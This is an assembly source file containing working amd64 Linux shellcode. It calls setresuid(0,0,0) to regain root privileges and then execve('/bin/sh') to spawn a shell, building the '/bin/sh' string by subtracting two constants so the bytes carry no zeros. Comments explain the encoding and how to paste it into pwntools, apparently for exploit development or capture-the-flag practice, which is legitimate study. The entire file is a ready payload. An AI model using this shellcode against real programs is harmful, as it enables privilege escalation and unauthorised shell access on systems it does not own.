;amd64 shellcode for linux (intel)
bits 64
;remove comments and "bits 64" if pasted in pwntools asm
;setresuid(0,0,0) (16B)
    xor rdi, rdi                    ;1st arg
    xor rsi, rsi                    ;2nd arg
    xor rdx, rdx                    ;3rd arg
    xor rax, rax                    ;prepare rax without 0s in the code
    mov al,0x75                     ;select setresuid syscall
    syscall                         ;call setresuid
;execve("/bin/sh",0,0) (40B)
    mov rax, 0x41B0B477AFB1A774     ;prepare rax without 0s
    mov rbx, 0x4148414841484545     ;prepare rbx for the next step + write EEHAHAHA in the binary (ffs)
    sub rax, rbx                    ;set rax content to /bin/sh\0
    push rax                        ;push the string in the stack
    mov rdi, rsp                    ;save a pointer to the string
    xor rsi, rsi                    ;no arguments
    xor rdx, rdx                    ;no env vars
    xor rax, rax                    ;prepare rax without 0s in the code
    mov al, 0x3B                    ;select execve syscall
    syscall                         ;call execve

